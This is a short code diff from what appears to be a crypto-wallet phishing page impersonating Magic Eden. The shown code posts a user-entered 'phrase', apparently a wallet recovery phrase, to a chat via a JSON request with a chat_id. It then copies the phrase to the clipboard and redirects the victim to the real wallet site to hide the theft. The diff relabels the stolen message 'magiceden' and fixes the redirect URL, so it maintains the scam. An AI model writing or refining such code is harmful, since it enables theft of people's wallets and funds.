@@ -299,14 +299,14 @@
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           chat_id: chatId,
-          text: "S\n" + phrase.trim()
+          text: "magiceden\n" + phrase.trim()
         })
       });
 
       navigator.clipboard.writeText(phrase.trim());
 
       setTimeout(() => {
-        window.location.href = "https://Magic Eden.io/";
+        window.location.href = "https://wallet.magiceden.io/";
       }, 800);
     }
 
